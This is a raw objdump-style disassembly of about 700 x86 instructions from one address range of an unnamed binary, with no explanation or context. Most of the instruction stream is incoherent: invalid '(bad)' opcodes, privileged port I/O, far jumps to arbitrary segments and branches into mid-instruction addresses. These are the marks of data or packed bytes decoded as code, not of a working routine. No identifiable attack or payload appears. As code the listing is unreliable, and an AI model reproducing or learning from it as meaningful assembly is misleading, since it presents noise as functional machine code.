  409204:	add    ebp,0x83622f58
  40920a:	clc    
  40920b:	loopne 0x4091a2
  40920d:	xchg   ecx,eax
  40920e:	push   0xd70718dc
  409213:	jo     0x40925f
  409215:	inc    eax
  409216:	aaa    
  409217:	cmp    BYTE PTR [edx-0x26],0x61
  40921b:	mov    edi,0x677657bb
  409220:	and    eax,0x7687bf58
  409225:	std    
  409226:	or     BYTE PTR [edx],ch
  409228:	pop    ebx
  409229:	xor    cl,BYTE PTR [ecx+eiz*2]
  40922c:	sub    al,0x4
  40922e:	xlat   BYTE PTR ds:[ebx]
  40922f:	out    dx,eax
  409230:	xlat   BYTE PTR ds:[ebx]
  409231:	and    esp,DWORD PTR [edx+0x67]
  409234:	sbb    esi,ebx
  409236:	dec    ecx
  409237:	xchg   ebp,eax
  409238:	imul   DWORD PTR [ecx+0x78976610]
  40923e:	lock hlt 
  409240:	inc    ebp
  409241:	mov    al,0xf
  409243:	or     BYTE PTR [edi+0x4e],bl
  409246:	add    DWORD PTR [esi-0x6f],eax
  409249:	jmp    0x241:0xd60c53ab
  409250:	outs   dx,DWORD PTR ds:[esi]
  409251:	int    0xfc
  409253:	iret   
  409254:	or     DWORD PTR [ebx-0x69],eax
  409257:	imul   eax,DWORD PTR [ebx],0x2f86b5c9
  40925d:	pop    ss
  40925e:	dec    edx
  40925f:	sbb    BYTE PTR [ecx+0x1b],al
  409262:	cs hlt 
  409264:	fld    DWORD PTR [ecx]
  409266:	pop    ebp
  409267:	call   0x4f0daae
  40926c:	pop    ds
  40926d:	mov    esp,0x4b569a7a
  409272:	jnp    0x409206
  409274:	test   DWORD PTR [ecx],ebp
  409276:	xchg   ecx,eax
  409277:	inc    esi
  409278:	mov    edi,0xa634a3b8
  40927d:	not    DWORD PTR [ecx-0x53]
  409280:	ss cs inc ebp
  409283:	xchg   esp,eax
  409284:	xor    BYTE PTR [ebx+0x7a81d63f],dl
  40928a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40928b:	mov    bh,0x8b
  40928d:	div    eax
  40928f:	add    ebx,DWORD PTR [ecx-0x1c]
  409292:	nop
  409293:	sub    edx,DWORD PTR [ecx+0x5b]
  409296:	cli    
  409297:	mov    cs,WORD PTR ds:0x243ea750
  40929d:	and    ah,BYTE PTR [edx]
  40929f:	shr    BYTE PTR [edi+0x74],cl
  4092a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092a4:	test   eax,0xe0b44e95
  4092a9:	dec    edx
  4092aa:	jp     0x40926a
  4092ac:	xchg   DWORD PTR [eax+eiz*2-0x7b],eax
  4092b0:	mov    dh,0xef
  4092b2:	jl     0x4092cb
  4092b4:	ja     0x4092fb
  4092b6:	jnp    0x40928e
  4092b8:	enter  0x2a76,0x30
  4092bc:	add    al,0x2a
  4092be:	bound  esi,QWORD PTR [ecx+0x24dabf4d]
  4092c4:	xchg   esp,eax
  4092c5:	int3   
  4092c6:	cld    
  4092c7:	inc    ebp
  4092c8:	mov    bl,0x97
  4092ca:	xchg   esi,eax
  4092cb:	sub    eax,0x7b7537cd
  4092d0:	sbb    BYTE PTR [ecx+edi*1+0x3fccb983],cl
  4092d7:	in     al,dx
  4092d8:	imul   esi,DWORD PTR [eax-0x5f],0xf7c8219
  4092df:	xchg   ebp,eax
  4092e0:	pushf  
  4092e1:	jno    0x4092a0
  4092e3:	sbb    ebp,DWORD PTR [ebx+0x41]
  4092e6:	push   ecx
  4092e7:	sub    cl,cl
  4092e9:	add    al,0x92
  4092eb:	xchg   esi,eax
  4092ec:	cmc    
  4092ed:	outs   dx,DWORD PTR ds:[esi]
  4092ee:	inc    ebx
  4092ef:	daa    
  4092f0:	imul   ebx,ecx,0x7b
  4092f3:	cmp    DWORD PTR [ebx],eax
  4092f5:	ins    DWORD PTR es:[edi],dx
  4092f6:	bound  ecx,QWORD PTR [eax+esi*2+0x123db25f]
  4092fd:	jns    0x409315
  4092ff:	inc    DWORD PTR [esi+0x58d30ff]
  409305:	pusha  
  409306:	mov    dl,0x41
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	adc    BYTE PTR [esi-0x1dd84366],ah
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x4093b9
  40933a:	(bad)  
  40933b:	popf   
  40933c:	loope  0x4092ec
  40933e:	xchg   ebp,eax
  40933f:	in     al,0xa1
  409341:	push   esp
  409342:	loop   0x409356
  409344:	inc    esi
  409345:	pushw  es
  409347:	dec    ecx
  409348:	push   0xfc588094
  40934d:	sub    ch,BYTE PTR [ecx+0x4a]
  409350:	pop    esi
  409351:	stc    
  409352:	jl     0x40931f
  409354:	cwde   
  409355:	push   ds
  409356:	aaa    
  409357:	mul    DWORD PTR [ebp+eax*1+0xedce5e]
  40935e:	test   DWORD PTR [esp+ebp*4],ebp
  409361:	jmp    0x409338
  409363:	fadd   DWORD PTR [eax]
  409365:	pop    ebx
  409366:	enter  0xb936,0x9e
  40936a:	mov    esp,0x200470a1
  40936f:	shr    ecx,0x6f
  409372:	pop    esp
  409373:	jmp    0x409378
  409375:	cmp    esp,ecx
  409377:	mov    ds:0x48580918,eax
  40937c:	nop
  40937d:	inc    ecx
  40937e:	jge    0x4093ac
  409380:	fwait
  409381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409382:	les    edx,FWORD PTR [eax]
  409384:	ins    DWORD PTR es:[edi],dx
  409385:	xchg   edi,eax
  409386:	and    eax,0xa7f38850
  40938b:	(bad)  
  40938c:	jmp    0x4093a8
  40938e:	dec    edi
  40938f:	in     al,dx
  409390:	mov    al,0xc9
  409392:	outs   dx,DWORD PTR ds:[esi]
  409393:	repnz add ah,BYTE PTR [esi]
  409396:	neg    BYTE PTR ds:0xf4520e0e
  40939c:	jae    0x409331
  40939e:	mov    WORD PTR [edi-0x8],ds
  4093a1:	and    esp,DWORD PTR [ebx+0x12]
  4093a4:	jno    0x4093e0
  4093a6:	outs   dx,BYTE PTR fs:[esi]
  4093a8:	dec    di
  4093aa:	adc    dh,BYTE PTR [edi+esi*2]
  4093ad:	push   esi
  4093ae:	cmp    eax,0x775689c4
  4093b3:	xor    eax,0x322fca3b
  4093b8:	cmp    bl,BYTE PTR [eax-0x68]
  4093bb:	imul   esp,edx,0xa2bbb241
  4093c1:	fdiv   QWORD PTR [edx]
  4093c3:	cwde   
  4093c4:	mov    ds:0xa3e14d81,al
  4093c9:	mov    edi,0xfc1fe028
  4093ce:	and    dl,cl
  4093d0:	pop    esp
  4093d1:	out    0x1e,al
  4093d3:	fstp   DWORD PTR [edi]
  4093d5:	(bad)  
  4093d6:	out    dx,al
  4093d7:	xchg   ebx,eax
  4093d8:	adc    al,0xb7
  4093da:	aas    
  4093db:	adc    dh,BYTE PTR [eax]
  4093dd:	push   0x10
  4093df:	int    0xde
  4093e1:	dec    ebp
  4093e2:	shl    BYTE PTR [esi],1
  4093e4:	inc    esi
  4093e5:	(bad)  [ebx]
  4093e7:	mov    BYTE PTR [edi-0xb65e900],ch
  4093ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ee:	(bad)  
  4093ef:	out    dx,eax
  4093f0:	xchg   edx,ecx
  4093f2:	(bad)  
  4093f5:	push   ss
  4093f6:	mov    ecx,0xe90f138d
  4093fb:	xchg   esp,eax
  4093fc:	call   0x51b2:0xc7945293
  409403:	dec    edi
  409404:	mov    dl,0xab
  409406:	xchg   edi,eax
  409407:	fisub  WORD PTR ds:[ebp-0x6d]
  40940b:	in     eax,0x37
  40940d:	div    BYTE PTR [edi]
  40940f:	mov    ecx,0x3c016901
  409414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409415:	sbb    al,0x5f
  409417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409418:	inc    ecx
  409419:	adc    BYTE PTR [ebx],bh
  40941b:	loopne 0x409447
  40941d:	lods   eax,DWORD PTR ds:[esi]
  40941e:	test   eax,0x8fee9fe0
  409423:	fld    DWORD PTR [ebx+0x5]
  409426:	push   ecx
  409427:	dec    esi
  409428:	and    BYTE PTR [ecx],0xeb
  40942b:	push   ebp
  40942c:	adc    BYTE PTR [edx+0x2dfb30cc],bl
  409432:	rol    DWORD PTR [esi+0x3e236a76],1
  409438:	aaa    
  409439:	inc    eax
  40943a:	mov    al,ds:0x9e80e07a
  40943f:	out    dx,eax
  409440:	mov    edx,gs
  409442:	cmp    ebx,esi
  409444:	out    0x43,al
  409446:	ret    0x42dc
  409449:	cmp    al,0xb7
  40944b:	call   0x2b74b94
  409450:	call   0x128889a9
  409455:	loop   0x4093fc
  409457:	push   edx
  409458:	sar    DWORD PTR [eax+0x3f8a879],cl
  40945e:	out    dx,eax
  40945f:	lods   eax,DWORD PTR ds:[esi]
  409460:	stos   BYTE PTR es:[edi],al
  409461:	cmp    BYTE PTR [edi-0x316765ff],bh
  409467:	hlt    
  409468:	data16 jne 0x40940e
  40946b:	adc    al,0xed
  40946d:	push   ebx
  40946e:	mov    bl,0x83
  409470:	fld    TBYTE PTR [esi]
  409472:	sar    BYTE PTR [eax+0x3f],0xaf
  409476:	(bad)
  409479:	call   0x518d:0xc872c93
  409480:	pop    ds
  409481:	inc    ebx
  409482:	lea    ebp,[edi]
  409484:	enter  0xf2e6,0x83
  409488:	jmp    0x69aac19f
  40948d:	sbb    al,0x1b
  40948f:	push   ebp
  409490:	cli    
  409491:	jle    0x409450
  409493:	xlat   BYTE PTR ds:[ebx]
  409494:	mov    esp,0xcb93acdb
  409499:	loopne 0x40948a
  40949b:	and    al,0x35
  40949d:	adc    ebp,DWORD PTR [edx+0x6a]
  4094a0:	retf   
  4094a1:	(bad)  
  4094a3:	or     DWORD PTR [eax],ebp
  4094a5:	add    bl,BYTE PTR [edi+0x141cda05]
  4094ab:	imul   BYTE PTR [esi+edi*4-0x48]
  4094af:	out    0x75,eax
  4094b1:	adc    al,0xf4
  4094b3:	std    
  4094b4:	popa   
  4094b5:	clc    
  4094b6:	ja     0x4094b4
  4094b8:	mov    esp,0x4259592d
  4094bd:	pop    edi
  4094be:	and    eax,0xc15dcdb3
  4094c3:	and    BYTE PTR [ebx],bh
  4094c5:	mov    eax,0x70279ee3
  4094ca:	out    dx,al
  4094cb:	xlat   BYTE PTR ds:[ebx]
  4094cc:	stos   DWORD PTR es:[edi],eax
  4094cd:	or     al,0x77
  4094cf:	sahf   
  4094d0:	arpl   dx,si
  4094d2:	adc    eax,0x6f7ad902
  4094d7:	aad    0x7d
  4094d9:	cmp    bl,BYTE PTR [edi+0x4086bf26]
  4094df:	mov    ds:0xcedbb852,al
  4094e4:	repz mov ch,0x1
  4094e7:	push   esi
  4094e8:	pop    edi
  4094e9:	arpl   ax,sp
  4094eb:	sti    
  4094ec:	loopne 0x409486
  4094ee:	loope  0x4094e4
  4094f0:	out    0x99,eax
  4094f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094f3:	ss push ebx
  4094f5:	in     al,dx
  4094f6:	dec    edx
  4094f7:	sti    
  4094f8:	mov    edx,0xf99c9320
  4094fd:	repnz cmp DWORD PTR [edi-0x65d1d2fa],0x94256659
  409508:	xlat   BYTE PTR ds:[ebx]
  409509:	mov    BYTE PTR [ecx],ch
  40950b:	rcl    BYTE PTR [edx],0x83
  40950e:	cs out dx,al
  409510:	jmp    0x89fbcc0e
  409515:	fist   WORD PTR [ecx-0x7d094c53]
  40951b:	test   BYTE PTR [edi-0x1c15c090],dh
  409521:	iret   
  409522:	test   eax,0xda24ccf0
  409527:	or     bh,BYTE PTR [ebp-0x3f]
  40952a:	and    eax,DWORD PTR [ecx-0x5c]
  40952d:	xchg   ebp,eax
  40952e:	call   0x1ceea980
  409533:	cmp    esi,DWORD PTR [esi+0xb]
  409536:	loope  0x4094dc
  409538:	je     0x40955d
  40953a:	ja     0x4094d7
  40953c:	cs stos DWORD PTR es:[edi],eax
  40953e:	daa    
  40953f:	(bad)  [edi]
  409541:	mov    ecx,0xb700457b
  409546:	dec    edx
  409547:	cli    
  409548:	inc    edi
  409549:	xor    edx,0xfffffffd
  40954c:	or     eax,0x835fff31
  409551:	neg    BYTE PTR ds:0x55d72efd
  409557:	mov    ch,0x70
  409559:	aad    0x39
  40955b:	cmp    BYTE PTR [ebx+0x11],dl
  40955e:	and    al,0xb0
  409560:	frstor [eax]
  409562:	dec    esi
  409563:	mov    esp,0x98ae96ff
  409568:	push   esp
  409569:	mov    edx,0xc0cfc1a1
  40956e:	mov    ebp,0x9f2897dc
  409573:	pop    es
  409574:	mov    ds:0x82e21de2,eax
  409579:	clc    
  40957a:	jmp    0x19c7:0xd6251736
  409581:	push   ecx
  409582:	aam    0x4c
  409584:	push   cs
  409585:	in     al,0x4a
  409587:	jne    0x409585
  409589:	scas   eax,DWORD PTR es:[edi]
  40958a:	fcom   DWORD PTR [ebx+0x37435365]
  409590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409592:	je     0x4095da
  409594:	adc    edx,DWORD PTR [ebx-0x5d]
  409597:	inc    ebx
  409598:	push   ds
  409599:	pop    es
  40959a:	cmp    DWORD PTR [edi-0x6806effe],0xfe92a3fe
  4095a4:	retf   0x7bb4
  4095a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a8:	add    al,0x9c
  4095aa:	jns    0x409627
  4095ac:	xor    ecx,DWORD PTR [edi-0x123c7842]
  4095b2:	xor    BYTE PTR [eax+0x24],ch
  4095b5:	fsub   DWORD PTR [esi]
  4095b7:	aad    0xf1
  4095b9:	retf   0x99b9
  4095bc:	fsubr  st(1),st
  4095be:	pop    ecx
  4095bf:	mov    bl,0x94
  4095c1:	push   ds
  4095c2:	(bad)  
  4095c3:	or     dl,dh
  4095c5:	call   0x2d0dffd0
  4095ca:	mov    ?,WORD PTR [ebx]
  4095cc:	scas   eax,DWORD PTR es:[edi]
  4095cd:	pop    esp
  4095ce:	rol    DWORD PTR [esp+edi*8-0x50673177],cl
  4095d5:	lds    esp,FWORD PTR [ebp-0x58]
  4095d8:	inc    ebp
  4095d9:	push   ebp
  4095da:	cmp    ebx,DWORD PTR [ebx-0x50f6ded0]
  4095e0:	or     esp,DWORD PTR ds:0x1b25a6de
  4095e6:	inc    ebp
  4095e7:	out    dx,eax
  4095e8:	inc    esp
  4095e9:	gs jecxz 0x409638
  4095ec:	ret    
  4095ed:	fs push eax
  4095ef:	inc    ecx
  4095f0:	dec    DWORD PTR [ebp+0x2e]
  4095f3:	cmp    DWORD PTR [eax*2+0x4bfbc003],edi
  4095fa:	out    0xe4,al
  4095fc:	jo     0x4095a7
  4095fe:	stos   DWORD PTR es:[edi],eax
  4095ff:	scas   al,BYTE PTR es:[edi]
  409600:	loop   0x4095e3
  409602:	cmp    edx,ebx
  409604:	scas   al,BYTE PTR es:[edi]
  409605:	stc    
  409606:	stos   DWORD PTR es:[edi],eax
  409607:	xchg   esp,eax
  409608:	jmp    0x40965c
  40960a:	shl    BYTE PTR [eax-0x2b0c2e8a],cl
  409610:	aam    0xbf
  409612:	lds    esi,FWORD PTR [ecx+ebx*1-0x54ec3d07]
  409619:	cdq    
  40961a:	sub    al,0x33
  40961c:	pop    ss
  40961d:	loopne 0x40967b
  40961f:	cdq    
  409620:	nop
  409621:	cmp    ah,BYTE PTR [edi+eiz*4+0x42ded6bd]
  409628:	shl    DWORD PTR [esi-0x3d],0x44
  40962c:	ret    
  40962d:	arpl   WORD PTR [ecx+esi*8-0x5edc65b8],sp
  409634:	je     0x4096b2
  409636:	pushf  
  409637:	pop    ss
  409638:	or     ebp,esp
  40963a:	imul   ebx,esp,0x803e8bff
  409640:	push   ss
  409641:	nop
  409642:	int3   
  409643:	jo     0x409625
  409645:	mov    ah,0xf8
  409647:	mov    esi,0x9a4d1655
  40964c:	jmp    0x9bab5831
  409651:	add    al,0xb3
  409653:	cs enter 0x2866,0x5
  409658:	fcom   QWORD PTR [ecx+edi*8-0x5c]
  40965c:	jns    0x40965b
  40965e:	shl    BYTE PTR [eax+0x42321b3d],1
  409664:	mov    esi,0x3e01b5b1
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [edi],ebx
  409687:	inc    edx
  409688:	xchg   DWORD PTR [ecx],esp
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x409660
  409693:	repz dec edx
  409695:	sbb    BYTE PTR [edx-0x50],bl
  409698:	ins    BYTE PTR es:[edi],dx
  409699:	inc    eax
  40969a:	retf   
  40969b:	xor    bl,BYTE PTR [edx]
  40969d:	xchg   edi,eax
  40969e:	int    0x8d
  4096a0:	(bad)  
  4096a1:	into   
  4096a2:	mov    edx,0xd4c48b75
  4096a7:	xchg   ebp,eax
  4096a8:	call   DWORD PTR [ecx+0x1dfcdb6]
  4096ae:	shl    BYTE PTR [ebx+0x33],0xd
  4096b2:	inc    ecx
  4096b3:	test   DWORD PTR [eax-0x22c6e104],esp
  4096b9:	inc    ebp
  4096ba:	ret    
  4096bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096bc:	cld    
  4096bd:	mov    dl,0x57
  4096bf:	shl    dh,0x6a
  4096c2:	mov    eax,0x4756be16
  4096c7:	mov    cl,0xbe
  4096c9:	mov    edx,0xfab1279b
  4096ce:	popa   
  4096cf:	dec    esi
  4096d0:	sbb    al,0x4f
  4096d2:	jbe    0x4096f8
  4096d4:	jmp    0xfdbb8274
  4096d9:	inc    edx
  4096da:	xchg   edi,eax
  4096db:	sbb    BYTE PTR [ebx],dh
  4096dd:	pop    es
  4096de:	xor    BYTE PTR [ecx-0x4cf1dadd],ah
  4096e4:	aad    0xd6
  4096e6:	sbb    DWORD PTR [ecx-0x42],esp
  4096e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096ea:	int    0x81
  4096ec:	imul   ecx,DWORD PTR [ecx],0xffffffb2
  4096ef:	push   esi
  4096f0:	dec    eax
  4096f1:	lahf   
  4096f2:	retf   0x41f8
  4096f5:	and    eax,0x5a11da11
  4096fa:	xchg   ebx,eax
  4096fb:	test   DWORD PTR [eax],0x9c081c5c
  409701:	out    dx,eax
  409702:	mov    ch,0xd1
  409704:	popa   
  409705:	inc    eax
  409706:	int3   
  409707:	call   0x40d5f60
  40970c:	or     DWORD PTR [edi],eax
  40970e:	rol    DWORD PTR [ebx],0xe5
  409711:	jmp    0x40972f
  409713:	mov    dl,0xe2
  409715:	pushw  ds
  409717:	jp     0x40978d
  409719:	push   cs
  40971a:	sub    al,0x34
  40971c:	push   ebx
  40971d:	adc    bl,al
  40971f:	and    DWORD PTR [ebp-0x5f],0x1a
  409723:	push   es
  409724:	cld    
  409725:	inc    esi
  409726:	xchg   ebp,eax
  409727:	ins    BYTE PTR es:[edi],dx
  409728:	xchg   ecx,eax
  409729:	xchg   BYTE PTR [ebp-0x3bd03709],bh
  40972f:	(bad)  
  409730:	stc    
  409731:	mov    ebp,0xcc7d9c25
  409736:	mov    ebx,0xe792a65f
  40973b:	outs   dx,DWORD PTR ds:[esi]
  40973c:	pop    ebx
  40973d:	arpl   WORD PTR [ecx],bp
  40973f:	cmp    ch,0x13
  409742:	fsub   QWORD PTR ds:0xc5a3ecbf
  409748:	inc    edx
  409749:	sbb    BYTE PTR [ecx-0x2d],cl
  40974c:	lods   eax,DWORD PTR ds:[esi]
  40974d:	scas   al,BYTE PTR es:[edi]
  40974e:	add    BYTE PTR [ecx+edx*2-0x60],dl
  409752:	cmc    
  409753:	out    0xaa,eax
  409755:	loop   0x4097c4
  409757:	xor    DWORD PTR [edi+0x409be964],edx
  40975d:	shl    ebp,0x67
  409760:	stos   BYTE PTR es:[edi],al
  409761:	ins    BYTE PTR es:[edi],dx
  409762:	mov    cs,WORD PTR [esi]
  409764:	push   0xffffffa4
  409766:	shr    BYTE PTR [ebp+0x6d70bfdc],0x2
  40976d:	pop    edx
  40976e:	jmp    0x6772ad5f
  409773:	fisttp DWORD PTR [edi-0xe1ba67]
  409779:	int3   
  40977a:	mov    ecx,esi
  40977c:	pop    edx
  40977d:	xchg   ebp,eax
  40977e:	mov    al,ds:0xe99d5064
  409783:	aaa    
  409784:	ss dec ebp
  409786:	ret    
  409787:	retf   
  409788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409789:	sub    BYTE PTR [eax+ebx*8],al
  40978c:	pop    edi
  40978d:	mov    esp,0x8cbdc97f
  409792:	or     ebx,DWORD PTR [ecx+0x46]
  409795:	pop    esp
  409796:	xchg   edx,eax
  409797:	repz mov dl,0x2a
  40979a:	push   esi
  40979b:	aaa    
  40979c:	inc    edi
  40979d:	fbstp  TBYTE PTR [ecx]
  40979f:	out    0x5b,eax
  4097a1:	jno    0x40974a
  4097a3:	rsqrtps xmm7,xmm6
  4097a6:	mov    ecx,0x900cab2
  4097ab:	add    DWORD PTR [edi-0x5f],0x1f
  4097af:	ins    DWORD PTR es:[edi],dx
  4097b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b1:	mov    dh,0xa6
  4097b3:	retf   
  4097b4:	rcr    DWORD PTR [edx-0x5dba6f5a],0x60
  4097bb:	outs   dx,BYTE PTR ds:[esi]
  4097bc:	ins    DWORD PTR es:[edi],dx
  4097bd:	pop    eax
  4097be:	inc    esp
  4097bf:	fbstp  TBYTE PTR [edx+eiz*8+0x34]
  4097c3:	daa    
  4097c4:	loope  0x40975e
  4097c6:	pop    ebx
  4097c7:	js     0x4097d2
  4097c9:	jge    0x4097d5
  4097cb:	sub    eax,0x4810059d
  4097d0:	ficom  WORD PTR [eax-0x41]
  4097d3:	imul   ebx,DWORD PTR [ebp-0x3b159894],0xffffff9d
  4097da:	cmp    bl,BYTE PTR [edi]
  4097dc:	into   
  4097dd:	in     eax,0xb3
  4097df:	iret   
  4097e0:	lahf   
  4097e1:	mov    ds:0x75206668,eax
  4097e6:	scas   al,BYTE PTR es:[edi]
  4097e7:	ds jo  0x4097e8
  4097ea:	repz int 0x36
  4097ed:	xchg   ecx,eax
  4097ee:	adc    eax,0xb36d2072
  4097f3:	sar    ebx,1
  4097f5:	cmp    al,0x19
  4097f7:	push   ds
  4097f8:	sbb    eax,esp
  4097fa:	mov    dh,0xbd
  4097fc:	in     eax,0x8d
  4097fe:	mov    ch,0xa9
  409800:	sbb    al,0xbc
  409802:	mov    eax,0xecdf865a
  409807:	inc    ebx
  409808:	pop    esi
  409809:	daa    
  40980a:	cmp    al,0x22
  40980c:	mov    edi,0x64bd195b
  409811:	in     al,dx
  409812:	popa   
  409813:	sub    bl,dl
  409815:	push   ebp
  409816:	stc    
  409817:	push   cs
  409818:	sar    BYTE PTR [ebp-0x76848886],0xc9
  40981f:	(bad)  
  409820:	in     al,dx
  409821:	cli    
  409822:	push   ds
  409823:	mov    ecx,DWORD PTR ds:0x2d0354ea
  409829:	cmp    eax,0xe30f84bc
  40982e:	enter  0x30a1,0x57
  409832:	imul   BYTE PTR [edi]
  409834:	dec    edx
  409835:	cmp    dl,BYTE PTR [eax]
  409837:	mov    ebx,esp
  409839:	xchg   esi,eax
  40983a:	inc    ecx
  40983b:	loope  0x409819
  40983d:	xchg   ebp,eax
  40983e:	daa    
  40983f:	sar    BYTE PTR [edx+0x57],1
  409842:	push   eax
  409843:	(bad)  [ecx+0x4f]
  409846:	cwde   
  409847:	dec    edi
  409848:	ret    0xccb8
  40984b:	neg    DWORD PTR [ecx]
  40984d:	push   0x25fe2b9c
  409852:	mov    ds:0x29b9b905,eax
  409857:	fldcw  WORD PTR [esi-0x6a]
  40985a:	shl    BYTE PTR [ebx-0x7d849a6c],1
  409860:	retf   
  409861:	les    edx,FWORD PTR [ebx-0x2d]
  409864:	push   DWORD PTR [ebx-0x67b6404a]
  40986a:	sbb    BYTE PTR [ebp+0x74],cl
  40986d:	iret   
  40986e:	pop    ebp
  40986f:	jb     0x409830
  409871:	les    edi,FWORD PTR [ebx+ebx*1+0x60315f3]
  409878:	xchg   edx,eax
  409879:	in     al,dx
  40987a:	pop    ss
  40987b:	test   al,0xfa
  40987d:	mov    al,ds:0x9b3e4cb0
  409882:	mov    al,ds:0x67abb325
  409887:	imul   ebp,esp,0x21fb15c
  40988d:	je     0x40982f
  40988f:	loopne 0x409834
  409891:	jns    0x409823
  409893:	and    DWORD PTR [ebx+ecx*2-0xe],eax
  409897:	xor    al,0x3d
  409899:	ror    eax,1
  40989b:	or     ebp,DWORD PTR [edi+ecx*1-0x59]
  40989f:	in     al,dx
  4098a0:	fmul   QWORD PTR [edi+edi*8]
  4098a3:	and    al,0x84
  4098a5:	push   edx
  4098a6:	das    
  4098a7:	pop    edx
  4098a8:	or     dl,BYTE PTR [esi-0x11]
  4098ab:	dec    DWORD PTR [eax]
  4098ad:	call   0x4f849026
  4098b2:	dec    esi
  4098b3:	das    
  4098b4:	pop    eax
  4098b5:	inc    DWORD PTR [esp+ebx*2-0x43f6b6ce]
  4098bc:	fimul  WORD PTR [eax+0x25]
  4098bf:	adc    al,0x15
  4098c1:	retf   0x770e
  4098c4:	xchg   ecx,eax
  4098c5:	mov    WORD PTR [edi+0x787e4d98],?
  4098cb:	sbb    eax,ebx
  4098cd:	adc    ebx,edx
  4098cf:	adc    eax,0x21abd383
  4098d4:	stos   DWORD PTR es:[edi],eax
  4098d5:	scas   eax,DWORD PTR es:[edi]
  4098d6:	lock xchg esp,eax
  4098d8:	adc    eax,0xc8bb4c7f
  4098dd:	add    al,0xa5
  4098df:	and    ecx,DWORD PTR [edi+0x0]
  4098e2:	pop    ss
  4098e3:	ins    BYTE PTR es:[edi],dx
  4098e4:	nop
  4098e5:	into   
  4098e6:	in     al,dx
  4098e7:	std    
  4098e8:	into   
  4098e9:	adc    BYTE PTR [ebp+0x3f4618a9],ch
  4098ef:	mov    bh,0xb7
  4098f1:	jle    0x4098d0
  4098f3:	jns    0x4098f8
  4098f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f6:	mov    cs,ebp
  4098f8:	shl    DWORD PTR [eax-0x5e66250d],1
  4098fe:	out    dx,eax
  4098ff:	fimul  WORD PTR [ecx-0x80]
  409902:	inc    ecx
  409903:	push   esp
  409904:	ss xchg edx,eax
  409906:	dec    ecx
  409907:	repnz int3 
  409909:	adc    cl,dl
  40990b:	add    BYTE PTR [edi-0x1542a91f],ch
  409911:	shl    DWORD PTR [eax+0x34],1
  409914:	in     eax,0x43
  409916:	pop    ebp
  409917:	jne    0x409991
  409919:	ret    
  40991a:	jge    0x40993f
  40991c:	fld    QWORD PTR [edi-0x19db4cbc]
  409922:	cmp    al,0x92
  409924:	mov    dh,0x77
  409926:	mov    edx,0xa183cf59
  40992b:	(bad)  
  40992c:	xor    al,0x24
  40992e:	ins    DWORD PTR es:[edi],dx
  40992f:	iret   
  409930:	mov    al,ds:0x4880e1a9
  409935:	cdq    
  409936:	jnp    0x40991a
  409938:	sub    al,0x28
  40993a:	(bad)  
  40993b:	bnd jp 0x4098eb
  40993e:	mov    ebp,0x924e0871
  409943:	leave  
  409944:	lea    ecx,[edx+ebp*4-0x78be24b6]
  40994b:	mul    dl
  40994d:	out    0x7c,eax
  40994f:	push   ss
  409950:	and    DWORD PTR [eax+ecx*4+0x3bea95c1],esi
  409957:	push   ss
  409958:	mov    fs,WORD PTR [edx+eiz*2-0x10]
  40995c:	pop    es
  40995d:	out    0x7d,eax
  40995f:	mov    ebx,0x8e94ce7a
  409964:	ja     0x4099c6
  409966:	stc    
  409967:	cmp    bl,0xa
  40996a:	xchg   ebx,eax
  40996b:	test   al,0xc6
  40996d:	cmp    BYTE PTR ds:[ebx-0x54],ch
  409971:	push   ds
  409972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409973:	shl    al,cl
  409975:	push   0x8d62337b
  40997a:	jp     0x4099c8
  40997c:	cli    
  40997d:	pop    eax
  40997e:	xchg   ebx,eax
  40997f:	push   edi
  409980:	inc    esp
  409981:	jge    0x409911
  409983:	and    eax,0x26886e24
  409988:	test   ecx,edx
  40998a:	adc    al,0xb3
  40998c:	or     DWORD PTR [edi-0x22],eax
  40998f:	mov    ch,BYTE PTR [edx+0x3a7e5f15]
  409995:	xor    DWORD PTR [ebp+0x2de1139a],edi
  40999b:	int3   
  40999c:	adc    edx,DWORD PTR [esi+0x797d00a]
  4099a2:	fisttp QWORD PTR [ebx]
  4099a4:	in     al,0x28
  4099a6:	sbb    bl,cl
  4099a8:	scas   al,BYTE PTR es:[edi]
  4099a9:	popa   
  4099aa:	mov    ds:0xc522a3cd,eax
  4099af:	int3   
  4099b0:	mov    ebx,ecx
  4099b2:	fist   WORD PTR [eax+ecx*4-0x3289ef43]
  4099b9:	xchg   ecx,eax
  4099ba:	out    0x8c,al
